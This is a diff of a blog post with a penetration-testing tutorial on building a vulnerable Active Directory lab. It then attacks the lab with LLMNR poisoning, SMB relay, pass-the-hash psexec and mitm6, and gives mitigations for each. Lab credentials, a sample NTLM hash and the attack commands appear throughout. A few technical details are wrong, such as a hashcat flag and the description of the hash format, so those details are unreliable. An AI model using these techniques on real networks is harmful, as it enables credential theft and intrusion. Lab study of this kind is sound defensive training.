@@ -1,4 +1,7 @@
 ---
+toc: true
+toc_sticky: true
+classes: wide 
 title: "How to Set Up and Exploit an Active Directory Lab"
 date: 2025-05-29T12:20:30-05:30
 categories:
@@ -15,14 +18,14 @@ tags:
 
 ---
 
-> # AD Overview
+# AD Overview
 * Developed by Microsoft to manage Windows Domain Networks. Is it an **Identity Management Service**.
 *  Stores information related to objects, such as Computers, Users, Printers, etc.
 * Authenticates via Kerberos tickets. Non-windows devices, such as Linux machines, firewalls, etc. can also authenticate to AD via RADIUS or LDAP.
 
 ---
 
-># AD Components
+# AD Components
 
 | Physical                           | Logical                  |
 | ---------------------------------- | ------------------------ |
@@ -35,13 +38,13 @@ tags:
 |                                    | Organization Units (OUs) |
 
 
-> ### Physical Components
+## Physical Components
 1. **Domain Controller:** host a copy of the AD DS  (Active Directory Domain Services) directory store. Provides authentication and authorization services. Replicates updates to other domain controllers in the domain and forest. Allow administrative access to manage user account and network resources.
 2. **AD DS Data Store:** contains the database files and processes that store and manage directory information for user, services and applications. Consists `Ntds.dit` file. Default path: `%SystemRoot%\NTDS folder` on all domain controllers. It is accessible **only** though domain controller processes and protocols.
 
 ---
 
->### Logical Components
+## Logical Components
 - **AD DS Schema:** like a rulebook/blueprint, defines every type of objects that can be stores in the directory. Enforces rules regarding object creation and configuration.
 
 | Object Types     | Function                                      | Examples       |
@@ -61,13 +64,14 @@ tags:
 | **Transitive**  | If domain A trusts domain B, and domain B trusts domain C, then domain A automatically trusts domain C. This creates a "chain" of trust. |
 
 
->![Type of Trusts](/assets/images/Active-Directory/Type-of-Trusts.png)
+![Type of Trusts](/assets/images/Active-Directory/Type-of-Trusts.png)
 >- **Objects:** lives inside of OUs, contains a lot of different things, e.g. Users, Groups, Computers, Printers, Shared folders. There are class object and attribute object.
 
 ---
 
-># AD Lab Build
-### Requirements:
+# AD Lab Build
+This is the walkthough of setting up the Active Directory Infratructure.
+## Requirements:
 - 1 Windows Server (2022)
 - 2 Windows Workstations (Windows 10)
 - 60 GB Space
@@ -77,7 +81,7 @@ tags:
 
 ---
 
->### Setting up Domain Controller
+## Setting up Domain Controller
 1. Create new Virtual Machine
 2. Typical
 3. Installer disc image file (iso) → Browse and select Server 2022.
@@ -88,7 +92,7 @@ tags:
 
 ---
 
->### Setting Up a Domain
+## Setting Up a Domain
 1. Open **Server Manager**.
 2. Navigate to **Manage** → **Add Roles and Features**.
 3. Click **Next** until you reach the **Installation Type** page, and select **Role-Based or Feature-Based Installation**.
@@ -103,7 +107,7 @@ tags:
 
 ---
 
->### Setting Up AD Certificate Services
+## Setting Up AD Certificate Services
 1. Go to **Manage** → **Add Roles and Features** again.
 2. Proceed to **Role-Based or Feature-Based Installation**.
 3. On the **Server Roles** page, select **Active Directory Certificate Services**.
@@ -118,7 +122,7 @@ tags:
 
 ---
 
->### Setting up Windows Workstations
+## Setting up Windows Workstations
 1. Install Windows 10 on VMware.
 2. During account setup → **Domain join instead**
 3. Setup credentials. 
@@ -128,7 +132,7 @@ tags:
 
 ---
 
->### Setting Up Users, Groups, and Policies in Active Directory
+## Setting Up Users, Groups, and Policies in Active Directory
 1. Open **Server Manager** and navigate to:  
    **Tools → Active Directory Users and Computers**
 2. In the left pane, explore the default **Organizational Units (OUs)** like `Users`, `Computers`, etc.
@@ -148,32 +152,32 @@ tags:
 
 ---
 
->![Setup Users, Groups and Policies](/assets/images/Active-Directory/Setup-User-Group-Policy.png)
+![Setup Users, Groups and Policies](/assets/images/Active-Directory/Setup-User-Group-Policy.png)
 
->1. You can write the password in the description of SQL Service account. This will come later while exploitation. (Information Exposure)
+1. You can write the password in the description of SQL Service account. This will come later while exploitation. (Information Exposure)
 2. **Low Level User Creation:** Right Click → New → User
 3. `fcastle:Password1` and `pparker:Password2`
 
->**Low Level User vs Domain Admins**
+**Low Level User vs Domain Admins**
 * ![Low Level user](/assets/images/Active-Directory/Low-Level.png)
 * ![Domain Admin](/assets/images/Active-Directory/Domain-Admin.png)
 
 ---
 
->#### Create a File Service
+### Create a File Service
 1. Server Manager → File and Storage Services → Shares → Tasks → New Share → SMB Share Quick → Next → Give a share name (hackme) → Next x2 → Create
 
 ---
 
->#### Setup Service Account fully (SQLService)
+### Setup Service Account fully (SQLService)
 1. Open CMD with Administrator Privileges
 2. `setspn -a HYDRA-DC/SQLService.MARVEL.local:60111 MARVEL\SQLService`
 3. Check: `setspn -T MARVEL.local -Q */*`
 
 ---
 
->### Setup Group Policy
-#### 1. Create and Link a New GPO
+## Setup Group Policy
+### 1. Create and Link a New GPO
 - Open **Group Policy Management**  
 - Navigate to:  
   `Forest → Domains → MARVEL.local`  
@@ -182,31 +186,31 @@ tags:
 - Name the new GPO, for example: `Disable Windows Defender`  
 - Right-click the newly created GPO → **Edit**
 
->#### 2. Edit the GPO to Disable Windows Defender
+### 2. Edit the GPO to Disable Windows Defender
 In the **Group Policy Management Editor**:
 - Go to:  
   `Computer Configuration → Policies → Administrative Templates → Windows Components → Microsoft Defender Antivirus`
 - Find and double-click: **Turn off Microsoft Defender Antivirus**
 - Set the policy to **Enabled** → Click **OK**
 
->#### 3. Enforce the GPO
+### 3. Enforce the GPO
 - In Group Policy Management, right-click the GPO you just created → Select **Enforced**
 
->#### 4. Result
+### 4. Result
 - This GPO will now apply to **all domain-joined computers**.  
 - Any new user or system joining the domain will automatically receive this policy and have Microsoft Defender Antivirus disabled.
 
 ---
 
->#### Setup Networking for the Domain
+### Setup Networking for the Domain
 1. Open Network and Internet Settings → Change adapter options → Select Adapter → Properties → IPv4 → Use the following IP address → Change it to IPv4 and gateway address.
 2. We will lose internet connection now because now we only have an static IP.
 ![Setup Networking](/assets/images/Active-Directory/Setup-Networking.png)
 
 ---
 
->## Joining Windows Workstations to the Domain
-#### 1. Configure Network Settings on Workstations
+## Joining Windows Workstations to the Domain
+### 1. Configure Network Settings on Workstations
 - **THEPUNISHER:**  
   - Log in → Open **Change Adapter Settings** → Edit IPv4 properties  
   - Set the Domain Controller's IP address as the DNS server  
@@ -216,7 +220,7 @@ In the **Group Policy Management Editor**:
   ![Spiderman Networking](/assets/images/Active-Directory/Spiderman-Networking.png)
 
 
->#### 2. Join Workstations to the Domain
+### 2. Join Workstations to the Domain
 - Navigate to **Settings** → **Accounts** → **Access work or school**  
 - Click **Connect** → **Join this device to a local Active Directory domain**  
 - Enter domain name: `MARVEL.local`  
@@ -225,7 +229,7 @@ In the **Group Policy Management Editor**:
 - After joining, verify the computers appear in the Domain Controller as `THEPUNISHER` and `SPIDERMAN`.
 
 
->#### 3. Configure Local Administrator Accounts
+### 3. Configure Local Administrator Accounts
 - **THEPUNISHER:**  
   - Open **Local Users and Groups** → **Users**  
   - Set password for the `Administrator` account to `Password1!`  
@@ -241,7 +245,7 @@ In the **Group Policy Management Editor**:
 Note: `fcastle` will be an administrator on both workstations.
 
 
-> #### 4. Logging in and Mapping Network Drives
+### 4. Logging in and Mapping Network Drives
 - Log out, then log into SPIDERMAN as domain user `peterparker`  
   - To log in as a local user, use: `.\peterparker`  
 - Open **File Explorer** → **This PC** → **Map Network Drive**  
@@ -251,7 +255,7 @@ Note: `fcastle` will be an administrator on both workstations.
 - Check **Remember my credentials**
 
 
->#### 5. Verify Network Profile on Domain Controller
+### 5. Verify Network Profile on Domain Controller
 Open PowerShell on the Domain Controller and run:
 ```powershell
 Get-NetConnectionProfile
@@ -259,7 +263,7 @@ Get-NetConnectionProfile
 
 ---
 
-># Attacking AD: Initial Attack Vectors
+# Attacking AD: Initial Attack Vectors
 **Overview:** You have a VPN connection into an Organization (MARVEL.local). It has a Domain Controller (HYDRA-DC) and two Computers connected in the domain (THEPUNISHER and SPIDERMAN). 
 - **THEPUNISHER:** 
     - Local Administrator
@@ -277,17 +281,17 @@ Get-NetConnectionProfile
 
 ---
 
->### LLMNR Poisoning
-##### What is LLMNR?
+## LLMNR Poisoning
+### What is LLMNR?
 * Link Local Multicast Name Resolution, it is used to identify hosts when DNS fails to do so. Older version - NBT-NS. Key-flaw is that the service utilize a user's username and NTLMv2 hash when appropriately responded to. (we as an attack maliciously respond).
 
->![LLMNR Overview](/assets/images/Active-Directory/LLMNR-Overview.png)
+![LLMNR Overview](/assets/images/Active-Directory/LLMNR-Overview.png)
 
 >**Scenario:** A user does a typo while entering a Share name (hackm instead of hackme). The server have no idea where that is, so it broadcasts in the network if anyone know the location of "hackm". Now, we as an attacker responds YES to the computer asking for hackm's location, we know where hack just send me you hash and we'll connect you. And the computer passes us the hash.
 
 ---
 
->##### Capturing hash with Responder
+### Capturing hash with Responder
 1. ```
 sudo responder -I eth0 -dw
 ```
@@ -304,7 +308,7 @@ hashcat -a 5600 rockyou.txt fcatle.hash
 
 ---
 
->##### LLMNR Poisoning Mitigations
+### LLMNR Poisoning Mitigations
 * The best defence in this case is to disable LLMNR and NBT-NS.
 1. Group Policy Management → Edit/Create a policy → Computer Configurations → Administrative Templates → Network → DNS Client → Turn off Multicast Name Resolution
 2. Enable it → Apply → OK
@@ -315,18 +319,18 @@ hashcat -a 5600 rockyou.txt fcatle.hash
 
 ---
 
->### SMB Relay
-##### What is SMB Relay?
+## SMB Relay
+### What is SMB Relay?
 * Instead of cracking hashes gathered with Responder, we can relay those hashes to specific machines and potentially gain access.
 
->##### Requirements
+### Requirements
 1. SMB signing must be disabled or not enforced on the target. (which is default setting for workstations, but SMB signing is enabled/enforced on servers by default)
 2. Relayed user credentials must be of local administrator of that machine for any retal value.
 3. It must be relayed to a different machine. A user cannot relay the hash to himself/to his machine.
 
 ---
 
->##### Identify Hosts Without SMB Signing
+### Identify Hosts Without SMB Signing
 1. ```bash
 nmap --script=smb2-security-mode.nse -p445 <IP>
 ```
@@ -334,7 +338,7 @@ nmap --script=smb2-security-mode.nse -p445 <IP>
 
 ---
 
->##### Exploitation
+### Exploitation
 1. ```bash
 sudo nano /etc/responder/Responder.conf
 ```
@@ -369,7 +373,7 @@ peterparker:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b94
 
 ---
 
->##### SMB Relay Attacks Defence
+### SMB Relay Attacks Defence
 1. Enable SMB signing on all the devices. Con: can cause performance issue with the file copies.
 2. Disable NTLM authentication on network. Con: If Kerberos stops working, Windows defaults back to NTLM (which is bad).
 3. Account tiering: Limits domain admin to specific tasks. Con: Enforcing and maintaining the policy may be difficult.
@@ -377,9 +381,9 @@ peterparker:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b94
 
 ---
 
->## Gaining Shell Access
-##### Metaspooit
-###### Using Password
+## Gaining Shell Access
+### Metaspooit
+#### Using Password
 1. Metasploit's exploits are available, but they are too noisy, which often gets picked up by detection systems.
 * ```bash
 msfconsole
@@ -402,7 +406,7 @@ change if one doesn't work.
 run
 ```
 
->##### NTLM attack (using hash)
+#### NTLM attack (using hash)
 * ```bash
 unset SMBDomain
 ``` 
@@ -417,41 +421,41 @@ set smbpass <hash>
 >The hash has two parts: NT and LM. We need both → `aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f`
 First part before `:` it NT and after is LM.
 
->*
+*
 ```bash
 run
 ```
 
 ---
 
->#### psexec.py
-##### Using Password
+### psexec.py
+#### Using Password
 ```bash
 impackets-psexec MARVEL/fcastle:"Password12345!"@192.168.138.137
 ```
 
->OR, maybe if the password has a lot of characters that needs to be escaped do:
+OR, maybe if the password has a lot of characters that needs to be escaped do:
 ```bash
 impackets-psexec MARVEL/fcastle:@<IP>
 ```
 Then you can paste in the password.
 
->##### Using hash
+#### Using hash
 ```bash
 impackets-psexec administrator@<IP> -hashes <hash>
 ```
 
->If psexec does not work for some case, there are **wmiexec** and **smbexec** which basically works the same. It depends on the settings on the target machine.
+If psexec does not work for some case, there are **wmiexec** and **smbexec** which basically works the same. It depends on the settings on the target machine.
 
 ---
 
->### IPv6 Attacks
-##### Overview
+## IPv6 Attacks
+### Overview
 * This is a MitM attack where we as an attacker claims to be a DNS. Basically this can also be called a DNS takeover attack. Usually, a network does not use IPv6, still it is turned on. Network are generally utilizing IPv4. And, there no DNS for IPv6. As soon as we spoof the DNS server, all the IPv6 traffic is sent to us (spoofed IPv6 DNS server). With the authentication traffic (NTML) being sent though our DNS server, we can create a user (backdoor). This all is automated by a tool: **mitm6**.
 
 ---
 
->##### Exploitation
+### Exploitation
 1. ```bash
 ntlmrelayx.py -6 -t ldaps://192.168.138.136 -wh fakewpad.marvel.local -l lootme
 ```
@@ -476,7 +480,7 @@ mitm6 -d marvel.local
 
 ---
 
->##### Mitigation Strategies
+## Mitigation Strategies
 1. Disable IPv6 internally, but probably not the best idea due to side effects.
 2. Block instead of Allow prevents the attack from working:
 	(Inbound) Core Networking - Dynamic Host Configuration Protocol
